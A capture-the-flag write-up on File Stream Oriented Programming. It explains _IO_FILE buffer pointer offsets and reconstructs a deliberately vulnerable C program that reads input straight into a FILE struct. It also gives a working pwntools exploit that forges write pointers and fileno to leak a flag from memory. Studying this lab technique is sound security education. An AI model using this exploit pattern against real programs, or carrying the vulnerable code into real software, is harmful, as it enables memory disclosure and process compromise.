#metadata(
  (
    title: "Information Leak via _IO_FILE Corruption",
    description: "Corrupting the \_IO\_FILE structure to leak the flag from an arbitrary memory address.",
    date: "2026-01-01",
    order: 1,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Information Leak via \_IO_FILE Corruption

This challenge introduces File Stream Oriented Programming (FSOP) by providing a direct overwrite of an `_IO_FILE` structure. The goal is to leak a secret flag stored in memory.

== Visual Anatomy of `_IO_FILE`

Before diving into the challenge, it's crucial to understand the structure we are exploiting. The `FILE` struct (typedef for `struct _IO_FILE`) manages stream buffering.

=== Read Buffer Pointers
These pointers manage reading from the file.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Offset*], [*Field*], [*Description*],
    [`0x08`], `_IO_read_ptr`, [Current position in the buffer for reading.],
    [`0x10`], `_IO_read_end`, [End of the valid data in the read buffer.],
    [`0x18`], `_IO_read_base`, [Start of the read buffer.],
  ),
  caption: [Read pointers in `_IO_FILE` (x64).],
)

=== Write Buffer Pointers
These pointers manage writing to the file. This is our target for arbitrary read exploits.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Offset*], [*Field*], [*Description*],
    [`0x20`], `_IO_write_base`, [Start of the write buffer. *Exploit Target*: Point to start of secret.],
    [`0x28`], `_IO_write_ptr`, [Current write position. *Exploit Target*: Point to end of secret.],
    [`0x30`], `_IO_write_end`, [End of the write buffer.],
  ),
  caption: [Write pointers in `_IO_FILE` (x64).],
)

== Source Code

The challenge simulates a vulnerable application that allows you to overwrite the `FILE *fp` structure directly.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Global variables as observed in the binary
char secret[0x100];
FILE *fp;
char *buf;

// Helper to simulate create_tmp_file
void create_tmp_file() {
  int fd = open("/tmp/uiiaiiuuiiai.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd < 0) {
    perror("open");
    exit(1);
  }
  // Writing some dummy content as seen in strings
  const char *dummy = "FLAG{NOT_HAPPENING}\n";
  write(fd, dummy, strlen(dummy));
  close(fd);
}

// Helper to print FILE struct members (approximate based on standard glibc
// _IO_FILE) In a real exploit scenario, we inspect these to see the corruption.
void print_fp(FILE *f) {
  if (!f)
    return;

  printf("Here is the contents of the FILE structure.\n");
  printf("fp -> %p\n", f);

  // Accessing internals via casting to char* for offsets
  printf("0x00\t_flags \t\t\t*%p = 0x%x\n", (char *)f + 0x00,
         *(unsigned int *)((char *)f + 0x00));
  // 0x08 _IO_read_ptr
  printf("0x08\t_IO_read_ptr \t\t*%p = %p\n", (char *)f + 0x08,
         *(void **)((char *)f + 0x08));
  // 0x10 _IO_read_end
  printf("0x10\t_IO_read_end \t\t*%p = %p\n", (char *)f + 0x10,
         *(void **)((char *)f + 0x10));
  // 0x18 _IO_read_base
  printf("0x18\t_IO_read_base \t\t*%p = %p\n", (char *)f + 0x18,
         *(void **)((char *)f + 0x18));
  // 0x20 _IO_write_base
  printf("0x20\t_IO_write_base \t\t*%p = %p\n", (char *)f + 0x20,
         *(void **)((char *)f + 0x20));
  // 0x28 _IO_write_ptr
  printf("0x28\t_IO_write_ptr \t\t*%p = %p\n", (char *)f + 0x28,
         *(void **)((char *)f + 0x28));
  // 0x30 _IO_write_end
  printf("0x30\t_IO_write_end \t\t*%p = %p\n", (char *)f + 0x30,
         *(void **)((char *)f + 0x30));
  // 0x38 _IO_buf_base
  printf("0x38\t_IO_buf_base \t\t*%p = %p\n", (char *)f + 0x38,
         *(void **)((char *)f + 0x38));
}

void challenge(int argc, char **argv, char **envp) {
  create_tmp_file();

  buf = malloc(0x100);
  puts("### Welcome to io_file_leak!");

  // The binary uses "w" mode based on strings analysis
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "w");
  if (!fp) {
    perror("fopen");
    exit(1);
  }

  print_fp(fp);

  puts("Now reading from stdin directly to the FILE struct...");

  // VULNERABILITY: Reading user input directly into the FILE struct 'fp'
  read(0, fp, 0x1e0);

  print_fp(fp);

  // Writing buf to the file stream.
  // If we corrupted fp, this fwrite can trigger the exploit
  fwrite(buf, 1, 0x100, fp);
}

int main(int argc, char **argv, char **envp) {
  // Setup buffering
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  puts("###");
  printf("### Welcome to %s!\n", argv[0]);
  puts("###");

  puts("This challenge allows you to manipulate the memory of an _IO_FILE "
       "struct object.");
  puts("By doing this, you can arbitrarily read or write to take control of "
       "the process.");
  puts("You may also take control of the virtual function table pointer.");

  // Leak secret address
  printf("The secret is located at %p\n", secret);

  // Read flag into secret
  int fd = open("/flag", O_RDONLY);
  if (fd < 0) {
     // Warning: /flag not found, using dummy.
  } else {
    read(fd, secret, 0x64);
    close(fd);
  }

  challenge(argc, argv, envp);

  puts("### Goodbye!");

  return 0;
}
```

== Exploitation

The vulnerability is a direct overwrite of the `_IO_FILE` structure pointed to by `fp`. By crafting a fake `_IO_FILE` structure, we can trick standard library functions (like `fwrite` or `fflush`) into performing arbitrary actions.

In this level, we want to *leak* the secret. We can achieve this by manipulating the `_IO_write_base` and `_IO_write_ptr` pointers. When `fwrite` is called (or when the buffer is flushed), the library attempts to write data from the "write buffer". By setting these pointers to encompass our target data (the secret flag), we can trick the process into writing the flag to the file descriptor of our choice (stdout).

=== Exploit Script

```python
from pwn import *

# Context setup
elf = context.binary = ELF("./io_file_leak")
context.terminal = ["tmux", "splitw", "-h"]

p = process(elf.path)

# 1. Leak the address of the secret
p.recvuntil(b"located at")
flag_addr = int(p.recvline().strip(), 16)
info(f"Flag address: {hex(flag_addr)}")

# 2. Construct the fake File Structure
# pwntools provides a helper for this!
file = FileStructure()

# We want to perform an arbitrary WRITE (to stdout) from the secret location.
# In FSOP, "writing" usually means flushing the buffer.
# Setting the write base and ptr allows us to define the buffer to be flushed.
file.write(flag_addr, 0x200)

# Redirect output to stdout (fileno 1) instead of the temp file
file.fileno = 1

# Magic flags (internal glibc implementation detail)
# _flags2 = 0x41 often avoids some internal checks or sets specific modes
file._flags2 = 0x41

# 3. Send the payload
# We split at the flag because we constructed the object based on fields,
# but we need to serialize it correctly.
payload = bytes(file)

p.send(payload)

# 4. Receive the flag
print(p.recvall(timeout=2))
```

=== Key Concepts

- *\_IO_write_base*: Pointer to the start of the write buffer.
- *\_IO_write_ptr*: Pointer to the current end of the data in the write buffer.
- *\_fileno*: The underlying file descriptor used by `write` syscalls. Changing this to `1` redirects output to stdout.

When `fwrite` triggers a flush (or if we force one), the code calculates `count = _IO_write_ptr - _IO_write_base` and calls `write(fileno, _IO_write_base, count)`. By pointing `base` to `secret` and `ptr` to `secret + size`, we force a write of the secret!
